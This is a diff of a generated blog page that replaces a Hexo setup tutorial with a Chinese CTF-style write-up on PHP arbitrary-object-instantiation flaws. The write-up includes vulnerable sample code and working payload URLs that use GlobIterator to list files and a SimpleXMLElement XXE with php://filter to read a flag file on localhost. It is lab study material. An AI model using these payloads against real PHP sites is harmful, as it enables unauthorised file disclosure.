@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>搭建hexo的过程 |  Nil&#39;s Blog</title>
+      <title>实例化任意对象漏洞三 |  Nil&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/images/logo.png" />
@@ -65,7 +65,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-搭建hexo的过程"
+  id="post-3实例化任意对象漏洞"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  搭建hexo的过程
+  实例化任意对象漏洞三
 </h1>
  
 
@@ -84,15 +84,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/08/19/%E6%90%AD%E5%BB%BAhexo%E7%9A%84%E8%BF%87%E7%A8%8B/" class="article-date">
-  <time datetime="2021-08-19T03:19:46.000Z" itemprop="datePublished">2021-08-19</time>
+      <a href="/2022/11/25/3%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-11-25T01:24:18.749Z" itemprop="datePublished">2022-11-25</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">461</span>
+            <span class="post-count">568</span>
         </span>
     </span>
 
@@ -101,7 +101,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">2 分钟</span>
         </span>
     </span>
 </div>
@@ -116,98 +116,32 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>其实这次博客的搭建也是一次偶然，也想了想还是应该对自己的一些事情记录一下。</p>
+  <blockquote>
+<p>实例化任意对象漏洞</p>
+</blockquote>
+<hr>
 <span id="more"></span>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h1><p><em>博客目前托管在github上的，后期我想让他运行在自己的服务器上，让github作为一个备份。</em></p>
-<p>由于hexo是由Node.js写的，主要是需要以下的环境</p>
-<ul>
-<li><p>一台liunx 服务器（可以为本地）</p>
-</li>
-<li><p>git</p>
-</li>
-<li><p>Node.js</p>
-</li>
-</ul>
-<hr>
-<p>1.<strong>安装git</strong></p>
+
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p> 先来看个例子好理解</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$className</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$className</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$controllerName</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists(<span class="variable">$controllerName</span>)) &#123;</span><br><span class="line">    <span class="variable">$controller</span> = <span class="keyword">new</span> <span class="variable">$controllerName</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$controller</span>-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;There is no page with this name&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;new&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering new response&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering old response&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p> 这点代码中的<code>$controllerName</code>、<code>$data</code>可控，在<code>$controllerName</code>接收后传入到<code>class_exists()</code>函数，这个函数检测里面的<code>$controllerName</code>是否定义类，是的返回<code>True</code>，没有定义就会返回<code>False</code>，这里他会自己往下走。<br> 他会把<code>$controllerName</code>传入的东西进行实例化，内容呢就是<code>$data</code>传入，这里没有限制，所以我们可以使用xxe。<br> 也就是说让<code>$controllerName=SimpleXMLElement,$data=$xml,</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$xml = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///E:/phpStudy/PHPTutorial/php/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xee&lt;/x&gt;</span><br><span class="line">EOF;</span><br></pre></td></tr></table></figure>
+<h2 id="ctf-代码分析"><a href="#ctf-代码分析" class="headerlink" title="ctf 代码分析"></a>ctf 代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line">&lt;?php</span><br><span class="line">class NotFound&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;404&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">	function ($class)&#123;</span><br><span class="line">		new NotFound();</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">$classname = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : null;</span><br><span class="line">$param = isset($_GET[&#x27;param&#x27;]) ? $_GET[&#x27;param&#x27;] : null;</span><br><span class="line">$param2 = isset($_GET[&#x27;param2&#x27;]) ? $_GET[&#x27;param2&#x27;] : null;</span><br><span class="line">if(class_exists($classname))&#123;</span><br><span class="line">	$newclass = new $classname($param,$param2);</span><br><span class="line">	var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key=&gt;$value)</span><br><span class="line">        echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// f1agi3hEre.php</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> 结合上面的例子可以看到<code>class_exists()</code>函数里的<code>$classname</code>可控以及<code>$classname()</code>里面的内容也是可控的，<br> 那么可以传入恶意的类让他实例化。<br> 首先我们的目的是读取<code>flag.php</code>的内容，在不知情的情况下我们不知道这个文件叫什么名字，所以我们需要<code>GlobIterator</code>这个类来帮助我们去寻找。<br> 这里我找到一个使用例子来理解一下这个类</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/bcOOQH"><img src="https://s1.ax1x.com/2022/03/08/bcOOQH.jpg" alt="bcOOQH.jpg"></a><br> 第一个参数就是寻找的东西，后面的就是类似的过滤器，可以使用相对应的id号来使用。</p>
 <blockquote>
-<p>apt install date</p>
-<p>apt-get install git</p>
+<p>payload:<br><a target="_blank" rel="noopener" href="http://127.0.0.1/php/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0">http://127.0.0.1/php/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0</a></p>
 </blockquote>
-<p>2.<strong>安装Node.js和npm</strong></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/bcX0pD"><img src="https://s1.ax1x.com/2022/03/08/bcX0pD.jpg" alt="bcX0pD.jpg"></a></p>
+<p> 查找到后，就使用xxe来读取</p>
 <blockquote>
-<p>apt-get install nodejs</p>
-<p>apt-get install npm</p>
+<p>payload：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/php/index.php?name=SimpleXMLElement&amp;param=">http://127.0.0.1/php/index.php?name=SimpleXMLElement&amp;param=</a><?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY > xxe SYSTEM “php://filter/read=convert.base64-encode/resource=C:/PHPStudy/PHPTutorial/WWW/php/f1agi3hEre.&gt; php”&gt;]&gt;<x>%26xxe;</x>&amp;param2=2</p>
 </blockquote>
-<p>3.<strong>验证环境</strong></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/bcXTns"><img src="https://s1.ax1x.com/2022/03/08/bcXTns.jpg" alt="bcXTns.jpg"></a><br> 使用了php流来读取，因为其内容存在&lt; &gt; 这类的符号xxe会报错的，使用base64直接输出一下就行了</p>
 <blockquote>
-<p>nodejs –version</p>
-<p>npm -v </p>
-<p>git -v </p>
+<p>感谢红日安全的开源分享。<br><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
 </blockquote>
-<p>4.<strong>Hexo的安装</strong></p>
-<p><em>这里我选择的是全局安装</em></p>
-<blockquote>
-<p>npm install -g hexo-cli</p>
-<p>hexo init hexo</p>
-</blockquote>
-<p>到这里呢，hexo的安装就完成了</p>
-<blockquote>
-<p>可以使用</p>
-</blockquote>
-<blockquote>
-<p>hexo s</p>
-</blockquote>
-<p>访问 <a target="_blank" rel="noopener" href="http://0.0.0.0:4000/">http://0.0.0.0:4000</a> 可以验证一下。</p>
-<hr>
-<h1 id="Github环境配置"><a href="#Github环境配置" class="headerlink" title="Github环境配置"></a><strong>Github环境配置</strong></h1><p>1.首先让git全局记住我的github账号。</p>
-<blockquote>
-<p>git config –global user.name “Name”</p>
-</blockquote>
-<blockquote>
-<p>git config –global user.email “Email”</p>
-</blockquote>
-<p>2.生成SSH密钥</p>
-<blockquote>
-<p>ssh-keygen -t rsa -C <a href="mailto:&#120;&#x78;&#x78;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;">&#120;&#x78;&#x78;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;</a></p>
-</blockquote>
-<p>查看一下是否生成</p>
-<blockquote>
-<p>cat .ssh/id_rsa.pub</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbk3EF"><img src="https://z3.ax1x.com/2021/08/19/fbk3EF.png" alt="fbk3EF.png"></a></p>
-<p>3.配置github</p>
-<p>上github，创建项目</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbA8qf"><img src="https://z3.ax1x.com/2021/08/19/fbA8qf.png" alt="fbA8qf.png"></a></p>
-<p>将我刚刚生成的ssh-key加入到github上，这样就可以让他们两个愉快的玩耍了。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbAzOP"><img src="https://z3.ax1x.com/2021/08/19/fbAzOP.png" alt="fbAzOP.png"></a></p>
-<p>验证一下咱们的ssh是否成功的添加到了github上</p>
-<blockquote>
-<p>ssh -T <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#110;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#110;</a></p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbekfe"><img src="https://z3.ax1x.com/2021/08/19/fbekfe.png" alt="fbekfe.png"></a></p>
-<p>4.配置Hexo _config.yml</p>
-<blockquote>
-<p>deploy:</p>
-<p>type: git</p>
-<p>repo: <a href="mailto:&#103;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#104;&#117;&#98;&#46;&#99;&#x6f;&#x6d;">&#103;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#104;&#117;&#98;&#46;&#99;&#x6f;&#x6d;</a>:username/username.github.io.git</p>
-<p>branch: master</p>
-</blockquote>
-<p>5.部署到github</p>
-<p>完成上面的操作后本地就与github连接上了，咱们开始上传部署代码。</p>
-<blockquote>
-<p>hexo g </p>
-</blockquote>
-<blockquote>
-<p>hexo d</p>
-</blockquote>
-<hr>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbmFH0"><img src="https://z3.ax1x.com/2021/08/19/fbmFH0.png" alt="fbmFH0.png"></a></p>
-<p>如果需要修改域名访问的话就需要购买域名，并且需要解析一下。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbnTeI"><img src="https://z3.ax1x.com/2021/08/19/fbnTeI.png" alt="fbnTeI.png"></a></p>
-<p>还有一步需要配置，修改github 页面的设置。这里我已经修改好了域名。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/fbmxVx"><img src="https://z3.ax1x.com/2021/08/19/fbmxVx.png" alt="fbmxVx.png"></a></p>
-<h2 id="至此就已搭建完成了。"><a href="#至此就已搭建完成了。" class="headerlink" title="至此就已搭建完成了。"></a><strong>至此就已搭建完成了。</strong></h2> 
+ 
       <!-- reward -->
       
     </div>
@@ -229,7 +163,7 @@
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%B6%E4%BB%96/" rel="tag">-其他</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E5%AE%A1%E8%AE%A1/" rel="tag">php审计</a></li></ul>
 
     </footer>
   </div>
@@ -237,19 +171,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/08/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/" class="article-nav-link">
+      <a href="/2022/11/25/1celery%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            记一次简单的接口测试
+            clelery 学习记录
           
         </div>
       </a>
     
     
-      <a href="/2021/08/18/test/" class="article-nav-link">
+      <a href="/2022/11/25/4%E5%BC%80%E5%8F%91%E9%AA%8C%E8%AF%81%E4%B8%8D%E5%85%A8/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">test</div>
+        <div class="article-nav-title">开发验证不全四</div>
       </a>
     
   </nav>
